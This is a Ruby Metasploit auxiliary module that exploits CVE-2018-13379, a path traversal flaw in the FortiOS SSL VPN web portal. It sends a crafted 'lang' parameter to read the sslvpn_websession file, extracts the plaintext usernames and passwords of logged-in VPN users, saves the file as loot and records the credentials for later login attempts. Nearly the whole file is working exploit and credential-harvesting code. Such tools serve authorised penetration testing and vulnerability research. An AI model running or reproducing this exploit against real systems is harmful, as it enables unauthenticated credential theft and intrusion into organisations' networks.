# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'FortiOS Path Traversal Credential Gatherer',
        'Description' => %q{
          Fortinet FortiOS versions 5.4.6 to 5.4.12, 5.6.3 to 5.6.7 and 6.0.0 to
          6.0.4 are vulnerable to a path traversal vulnerability within the SSL VPN
          web portal which allows unauthenticated attackers to download FortiOS system
          files through specially crafted HTTP requests.

          This module exploits this vulnerability to read the usernames and passwords
          of users currently logged into the FortiOS SSL VPN, which are stored in
          plaintext in the "/dev/cmdb/sslvpn_websession" file on the VPN server.
        },
        'References' => [
          %w[CVE 2018-13379],
          ['URL', 'https://www.fortiguard.com/psirt/FG-IR-18-384'],
          %w[EDB 47287],
          %w[EDB 47288]
        ],
        'Author' => [
          'lynx (Carlos Vieira)', # initial module author from edb
          'mekhalleh (RAMELLA Sébastien)' # Metasploit module author (Zeop Entreprise)
        ],
        'License' => MSF_LICENSE,
        'DefaultOptions' => {
          'RPORT' => 10_443,
          'SSL' => true
        }
      )
    )

    register_options([
      OptEnum.new('DUMP_FORMAT', [true, 'Dump format.', 'raw', %w[raw ascii]]),
      OptBool.new('STORE_CRED', [false, 'Store credential into the database.', true]),
      OptString.new('TARGETURI', [true, 'Base path', '/remote'])
    ])
  end

  def execute_request
    payload = '/../../../..//////////dev/cmdb/sslvpn_websession'

    uri = normalize_uri(target_uri.path, 'fgt_lang')
    begin
      response = send_request_cgi(
        {
          'method' => 'GET',
          'uri' => uri,
          'vars_get' => {
            'lang' => payload
          }
        }
      )
    rescue StandardError => e
      print_error(message(e.message.to_s))
      return nil
    end

    unless response
      print_error(message('No reply.'))
      return nil
    end

    if response.code != 200
      print_error(message('NOT vulnerable!'))
      return nil
    end

    if response.body =~ /var fgt_lang/
      print_good(message('Vulnerable!'))
      report_vuln(
        host: @ip_address,
        name: name,
        refs: references
      )
      return response.body if datastore['STORE_CRED'] == true
    end

    nil
  end

  def message(msg)
    "#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}"
  end

  def parse_config(chunk)
    chunk = chunk.split("\x00").reject(&:empty?)

    return if chunk[1].nil? || chunk[2].nil?

    {
      ip: @ip_address,
      port: datastore['RPORT'],
      service_name: @proto,
      user: chunk[1],
      password: chunk[2]
    }
  end

  def report_creds(creds)
    creds.each do |cred|
      cred = cred.gsub('"', '').gsub(/[{}:]/, '').split(', ')
      cred = cred.map do |h|
        h1, h2 = h.split('=>')
        { h1 => h2 }
      end
      cred = cred.reduce(:merge)

      cred = JSON.parse(cred.to_json)

      next unless cred && (!cred['user'].blank? && !cred['password'].blank?)

      service_data = {
        address: cred['ip'],
        port: cred['port'],
        service_name: cred['service_name'],
        protocol: 'tcp',
        workspace_id: myworkspace_id
      }

      credential_data = {
        origin_type: :service,
        module_fullname: fullname,
        username: cred['user'],
        private_data: cred['password'],
        private_type: :password
      }.merge(service_data)

      login_data = {
        core: create_credential(credential_data),
        status: Metasploit::Model::Login::Status::UNTRIED
      }.merge(service_data)

      create_credential_login(login_data)
    end
  end

  def run_host(ip)
    @proto = (ssl ? 'https' : 'http')
    @ip_address = ip

    print_status(message('Trying to connect.'))
    data = execute_request
    if data.nil?
      print_error(message('No data received.'))
      return
    end

    loot_data = case datastore['DUMP_FORMAT']
                when /ascii/
                  data.gsub(/[^[:print:]]/, '.')
                else
                  data
                end
    loot_path = store_loot('', 'text/plain', @ip_address, loot_data, '', '')
    print_good(message("File saved to #{loot_path}"))

    return if data.length < 110

    if data[73] == "\x01"
      separator = data[72..73]
    elsif data[105..109] == "\x00\x00\x00\x00\x01"
      separator = data[104..109]
    end
    data = data.split(separator)

    creds = []
    data.each_with_index do |chunk, index|
      next unless index.positive?

      next if chunk[0] == "\x00" || !chunk[0].ascii_only?

      creds << parse_config(chunk).to_s
    end
    creds = creds.uniq

    return unless creds.length.positive?

    print_good(message("#{creds.length} credential(s) found!"))
    report_creds(creds)
  end

end
